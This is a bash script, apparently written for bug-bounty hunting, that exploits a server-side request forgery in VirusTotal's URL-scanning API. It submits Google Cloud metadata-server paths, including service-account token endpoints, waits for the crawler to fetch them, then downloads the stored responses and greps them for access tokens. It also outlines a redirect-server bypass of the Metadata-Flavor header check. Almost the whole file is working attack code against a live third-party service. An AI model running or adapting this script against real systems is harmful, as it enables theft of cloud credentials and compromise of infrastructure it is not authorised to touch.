#!/usr/bin/env bash
# VirusTotal SSRF — GCP metadata paths + response body retrieval
# CONFIRMED: VT crawler runs on GCP VMs, 169.254.169.254 reachable ("Metadata Server for VM")
# TESTING: GCP-format paths (v1 + v1beta1) to get actual instance metadata / SA tokens
# Run: VT_API_KEY=<key> bash scripts/vt-gcp-ssrf.sh 2>&1 | tee ~/vt-gcp-ssrf-output.txt

set -euo pipefail
: "${VT_API_KEY:?Set VT_API_KEY}"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
BASE="https://www.virustotal.com/api/v3"
OUT="$HOME/bug-bounty-hunting-/results/virustotal.com/evidence"
CANDIDATES="$HOME/bug-bounty-hunting-/results/virustotal.com/03-candidates/candidates.jsonl"
mkdir -p "$OUT"

c() { curl -sk --connect-timeout 15 -A "$UA" -H "x-apikey: ${VT_API_KEY}" "$@"; }

b64url() {
  python3 -c "import base64,sys; print(base64.urlsafe_b64encode(sys.argv[1].encode()).decode().rstrip('='))" "$1"
}

log_candidate() {
  local vuln_class="$1" host="$2" sev="$3" evidence="$4" impact="$5"
  local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  local id; id=$(echo "${vuln_class}${host}${ts}" | md5sum | cut -c1-8)
  echo "{\"id\":\"C${id}\",\"ts\":\"${ts}\",\"vuln_class\":\"${vuln_class}\",\"host\":\"${host}\",\"severity\":\"${sev}\",\"evidence\":\"${evidence}\",\"impact\":\"${impact}\"}" \
    | tee -a "$CANDIDATES"
}

check_url_obj() {
  local url="$1"
  local b64; b64=$(b64url "$url")
  local obj; obj=$(c "${BASE}/urls/${b64}")

  CODE=$(echo "$obj" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('last_http_response_code','NOT_FETCHED'))" 2>/dev/null || echo "parse_error")
  SHA=$(echo "$obj" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('last_http_response_content_sha256',''))" 2>/dev/null || echo "")
  LEN=$(echo "$obj" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('last_http_response_content_length',''))" 2>/dev/null || echo "")
  HDRS=$(echo "$obj" | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d.get('data',{}).get('attributes',{}).get('last_http_response_headers',{}))[:200])" 2>/dev/null || echo "")
  FINAL=$(echo "$obj" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('last_final_url',''))" 2>/dev/null || echo "")
  REDIR=$(echo "$obj" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('redirection_chain',[])[:3])" 2>/dev/null || echo "")

  echo "  HTTP code:      ${CODE}"
  echo "  Content length: ${LEN}"
  echo "  Content SHA256: ${SHA}"
  echo "  Final URL:      ${FINAL}"
  echo "  Redirects:      ${REDIR}"
  echo "  Resp headers:   ${HDRS}"

  echo "$CODE $SHA $LEN $FINAL"
}

echo "══════════════════════════════════════════════════"
echo "CONFIRMED: VT crawler is inside GCP, reaches metadata server"
echo "Server: 'Metadata Server for VM' response header stored"
echo ""
echo "NOW TESTING: GCP-format IMDS paths"
echo "══════════════════════════════════════════════════"

echo ""
echo "=== STEP 1: Submit GCP-format metadata paths ==="
GCP_PATHS=(
  "http://169.254.169.254/computeMetadata/v1/"
  "http://169.254.169.254/computeMetadata/v1/instance/"
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/"
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/"
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
  "http://169.254.169.254/computeMetadata/v1/project/"
  "http://169.254.169.254/computeMetadata/v1/project/project-id"
  "http://169.254.169.254/computeMetadata/v1/instance/hostname"
  "http://169.254.169.254/computeMetadata/v1/instance/id"
  "http://169.254.169.254/computeMetadata/v1beta1/"
  "http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token"
  "http://169.254.169.254/computeMetadata/v1beta1/project/project-id"
  "http://169.254.169.254/computeMetadata/"
  "http://169.254.169.254/"
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
)

declare -A SUBMITTED_IDS
for url in "${GCP_PATHS[@]}"; do
  RESP=$(c -X POST "${BASE}/urls" --data-urlencode "url=${url}" 2>/dev/null)
  ANALYSIS_ID=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")
  ERR=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',{}).get('code','OK'))" 2>/dev/null || echo "")

  if [ -n "$ANALYSIS_ID" ]; then
    echo "[+] QUEUED  ${url}"
    echo "    ID: ${ANALYSIS_ID}"
    SUBMITTED_IDS["$url"]="$ANALYSIS_ID"
  else
    echo "[-] BLOCKED ${url}  (error: ${ERR})"
  fi
done

echo ""
echo "=== STEP 2: Wait 45s for VT crawler to fetch ==="
sleep 45

echo ""
echo "=== STEP 3: Check URL objects for crawler results ==="
FOUND_TOKEN=false
FOUND_200=false

for url in "${GCP_PATHS[@]}"; do
  echo ""
  echo "════ ${url}"
  RESULT=$(check_url_obj "$url")
  HTTP_CODE=$(echo "$RESULT" | awk '{print $1}')
  CONTENT_SHA=$(echo "$RESULT" | awk '{print $2}')

  if [ "$HTTP_CODE" = "200" ]; then
    echo "  [!!!] HTTP 200 FROM GCP METADATA SERVER"
    FOUND_200=true

    # Try to download the response content
    if [ -n "$CONTENT_SHA" ] && [ "$CONTENT_SHA" != "NOT_FETCHED" ]; then
      echo "  [*] Attempting to download response body via /api/v3/files/${CONTENT_SHA}..."
      CONTENT=$(c "${BASE}/files/${CONTENT_SHA}")
      CONTENT_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
        -H "x-apikey: ${VT_API_KEY}" "${BASE}/files/${CONTENT_SHA}")
      echo "  [*] /api/v3/files/{sha256} response: ${CONTENT_CODE}"
      echo "$CONTENT" | python3 -m json.tool 2>/dev/null | head -20

      # Check if token is in accessible metadata
      if echo "$CONTENT" | grep -q "access_token\|token_type\|Bearer\|ya29\."; then
        echo "  [!!!] GCP SERVICE ACCOUNT TOKEN FOUND IN RESPONSE BODY"
        FOUND_TOKEN=true
        log_candidate "SSRF-GCP-IMDS-token" "www.virustotal.com" "CRITICAL" \
          "VT crawler fetched ${url}, response stored in VT DB (sha256=${CONTENT_SHA}), contains GCP SA token accessible to any VT API user" \
          "Any VT user can exfiltrate GCP service account tokens from VT scanning infrastructure via URL submission SSRF"
        echo "$CONTENT" | python3 -m json.tool 2>/dev/null | tee "$OUT/CRITICAL-GCP-TOKEN-$(date +%s).json"
      fi
    fi

  elif [ "$HTTP_CODE" = "403" ]; then
    echo "  [~] HTTP 403 — GCP metadata server rejected (missing Metadata-Flavor header, but server reached)"
    if [ -n "$CONTENT_SHA" ]; then
      echo "  [*] 403 response body stored, sha256=${CONTENT_SHA}"
      # Try to download the 403 response body (might contain useful error info)
      CONTENT_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
        -H "x-apikey: ${VT_API_KEY}" "${BASE}/files/${CONTENT_SHA}")
      echo "  [*] Download attempt: ${CONTENT_CODE}"
    fi
  elif [ "$HTTP_CODE" != "NOT_FETCHED" ]; then
    echo "  [~] HTTP ${HTTP_CODE}"
    if [ -n "$CONTENT_SHA" ]; then
      echo "  [*] Response body stored, sha256=${CONTENT_SHA}"
    fi
  fi
done

echo ""
echo "=== STEP 4: Download stored 404 response body ==="
echo "(The /latest/meta-data/ 404 body is stored — see if it reveals GCP internals)"
EXISTING_SHA="cea25c7405b91e51cedd0094aea65a6a3af294e70144812fc63dad9bb3922994"
echo "SHA256: ${EXISTING_SHA}"
EXISTING_CONTENT=$(c "${BASE}/files/${EXISTING_SHA}")
EXISTING_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
  -H "x-apikey: ${VT_API_KEY}" "${BASE}/files/${EXISTING_SHA}")
echo "Download status: ${EXISTING_CODE}"
if [ "$EXISTING_CODE" = "200" ]; then
  echo "$EXISTING_CONTENT" | python3 -m json.tool 2>/dev/null | head -20
  echo "[*] Response body of 404 page accessible via VT files API"
  log_candidate "SSRF-GCP-IMDS-response-body" "www.virustotal.com" "HIGH" \
    "GCP Metadata Server response body (HTTP 404 to /latest/meta-data/) stored in VT at /api/v3/files/${EXISTING_SHA} and accessible to any VT API user" \
    "VT's URL crawler exfiltrates GCP internal server responses and stores them as files accessible to any VT community user"
else
  echo "[-] 404 response body not accessible via files API (${EXISTING_CODE})"
fi

echo ""
echo "=== STEP 5: Try redirect chain (SSRF bypass) ==="
echo "If VT follows redirects to metadata server, even Metadata-Flavor-gated endpoints might be bypassed"
echo ""
echo "Submit a URL to a server that will redirect to GCP IMDS paths..."
echo "NOTE: For this test, you need a server that redirects to GCP IMDS."
echo "      Set REDIRECT_SERVER env var if you have one:"
if [ -n "${REDIRECT_SERVER:-}" ]; then
  REDIR_RESP=$(c -X POST "${BASE}/urls" --data-urlencode "url=${REDIRECT_SERVER}/to-imds-token")
  REDIR_ID=$(echo "$REDIR_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null)
  echo "  Redirect chain submitted: ID=${REDIR_ID}"
else
  echo "  (Skipped — REDIRECT_SERVER not set)"
  echo "  To test: set up a server redirecting to:"
  echo "    http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
  echo "  Then: REDIRECT_SERVER=https://your-server bash scripts/vt-gcp-ssrf.sh"
fi

echo ""
echo "══════════════════════════════════════════════════"
echo "VERDICT:"
if $FOUND_TOKEN; then
  echo "  [CRITICAL] GCP SERVICE ACCOUNT TOKEN EXFILTRATED"
  echo "  → Submit bug report IMMEDIATELY"
elif $FOUND_200; then
  echo "  [HIGH/CRITICAL] GCP metadata server returned 200 to VT crawler"
  echo "  → Check the content SHA256 manually for token data"
  echo "  → Try redirect chain bypass next"
else
  echo "  [HIGH] SSRF CONFIRMED but GCP paths returned 403/404"
  echo "  → Metadata-Flavor header required blocks direct token access"
  echo "  → Try redirect chain bypass or other GCP internal services"
  echo "  → The SSRF itself (reaching GCP IMDS from VT) is still reportable as High"
fi
echo "══════════════════════════════════════════════════"
echo ""
echo "Evidence saved to: $OUT/"
